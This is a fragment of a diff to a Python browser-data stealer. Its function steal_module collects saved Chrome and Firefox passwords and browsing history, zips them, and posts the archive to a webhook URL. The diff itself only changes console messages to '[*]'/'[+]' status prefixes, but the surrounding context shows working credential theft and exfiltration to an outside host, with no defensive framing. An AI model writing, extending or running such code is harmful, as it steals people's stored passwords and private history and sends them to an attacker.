@@ -146,7 +146,7 @@ def steal_module():
         
         # Chrome
         if choice in ["1", "3"]:
-            print("Chrome...")
+            print("[*] Chrome...")
             psw, hist = get_chrome_data()
             
             # Chrome passwords
@@ -165,7 +165,7 @@ def steal_module():
         
         # Firefox
         if choice in ["2", "3"]:
-            print("Firefox...")
+            print("[*] Firefox...")
             psw, hist = get_firefox_data()
             
             # Firefox passwords
@@ -185,4 +185,4 @@ def steal_module():
     # 4. Envoi ZIP
     zip_buffer.seek(0)
     requests.post(WEBHOOK_URL, files={'file': ('browser_data.zip', zip_buffer)})
-    print("✅ Fini !")
+    print("[+] ✅ Fini !")
